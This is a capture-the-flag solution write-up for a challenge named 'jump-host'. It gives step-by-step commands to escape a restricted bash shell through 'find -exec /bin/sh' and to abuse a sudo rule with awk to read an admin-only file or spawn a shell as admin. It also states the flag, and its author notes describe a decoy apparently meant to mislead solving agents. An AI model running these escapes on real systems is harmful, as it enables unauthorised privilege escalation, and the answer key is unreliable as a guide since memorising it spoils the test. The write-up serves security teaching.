---
title: jump-host
category: misc
difficulty: medium
points: 100-500
author: s4l1
date: 2026-11-09
---
# Solution — jump-host

**Flag:** `ingehack{rb4sh_1s_n0t_4_j41l}`

---

## Step 1 — Look around

Log in as `guest` (password `guest`). The login shell is `rbash`, and PATH is
only `/home/guest/bin`, which holds three symlinks: `ls`, `less`, `find`.
Anything containing `/` is refused, `cd` is refused, and so are redirects.

The home directory contains a `README.txt` and a `.bash_history` that both
point at `/opt/tools/backup`, a SUID-root binary. Running it only prints
`backup: scanning /var/backups ...` forever. That is the decoy: the intended
path never needs it.

## Step 2 — Leave the restricted shell

`rbash` limits what the *shell* will name as a command. It does not stop a
program it starts from executing something else. `find` can do that directly,
and it is one of the three allowed commands:

```sh
find . -maxdepth 0 -exec /bin/sh \;
```

You now have a normal `/bin/sh` as `guest`. PATH is still
`/home/guest/bin`, so use absolute paths from here.

(`less` is the other classic escape — it has a `!command` shell escape — but
this login sets `SHELL` to the restricted wrapper and PATH contains no shell,
so `!` lands you back in the same box. `find` is the reliable route.)

## Step 3 — Read the sudo rule

```sh
/usr/bin/sudo -l
```

```text
User guest may run the following commands on ...:
    (admin) NOPASSWD: /usr/bin/awk
```

`guest` may run `awk` **as the `admin` user**, without a password. `awk` can
read any file the admin can read, and `/home/admin/flag.txt` is mode 600 and
owned by `admin`.

## Step 4 — Read the flag

```sh
/usr/bin/sudo -u admin /usr/bin/awk '{print}' /home/admin/flag.txt
```

or spawn a shell as `admin`:

```sh
/usr/bin/sudo -u admin /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

Output:

```text
ingehack{rb4sh_1s_n0t_4_j41l}
```

`solution/solve.sh` performs the same steps. It prompts for the `guest`
password; `sshpass -p guest ./solution/solve.sh [host] [port]` runs it
non-interactively. For a local container (plain SSH, no Traefik), set
`PLAIN=1`.

---

## Skills learned

| Step | Skill |
|---|---|
| 1 | Recognising restricted shell limits and not trusting planted history |
| 2 | Pivoting through a program that can execute another binary |
| 3 | Reading `sudo -l` and understanding `(user)` run-as rules |
| 4 | Using an allowed interpreter to read a file as another user |

## Author notes

- The decoy is deliberate: `/opt/tools/backup` is SUID root but only sleeps in
  a loop, and both `README.txt` and `.bash_history` advertise it. An agent that
  follows the history burns its time there.
- `Defaults:guest !requiretty` keeps the sudo rule usable from a
  non-interactive `sh` spawned by `find`.
- The flag is `/home/admin/flag.txt` (mode 600, `admin:admin`); `/flag` is not
  used, so the obvious SUID hunt has nothing to find.

## References

- GNU Bash manual, restricted shell:
  <https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html>
- GTFOBins, `awk` (sudo shell escape and file read):
  <https://gtfobins.github.io/gtfobins/awk/>
- GTFOBins, `find` (shell via `-exec`): <https://gtfobins.github.io/gtfobins/find/>
